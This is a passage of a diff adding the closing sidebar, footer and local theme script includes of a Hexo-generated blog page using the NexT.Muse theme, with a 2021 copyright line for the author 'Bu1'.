+        <span class="site-state-item-name">分类</span></a>
+      </div>
+  </nav>
+</div>
+
+
+
+      </div>
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer class="footer">
+      <div class="footer-inner">
+        
+
+        
+
+<div class="copyright">
+  
+  &copy; 
+  <span itemprop="copyrightYear">2021</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">Bu1</span>
+</div>
+  <div class="powered-by">由 <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://muse.theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Muse</a> 强力驱动
+  </div>
+
+        
+
+
+
+
+
+
+
+
+      </div>
+    </footer>
+  </div>
+
+  
+  <script src="/lib/anime.min.js"></script>
+  <script src="/lib/velocity/velocity.min.js"></script>
+  <script src="/lib/velocity/velocity.ui.min.js"></script>
+
+<script src="/js/utils.js"></script>
+
+<script src="/js/motion.js"></script>
+
+
+<script src="/js/schemes/muse.js"></script>
+
+
+<script src="/js/next-boot.js"></script>
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+</body>
+</html>
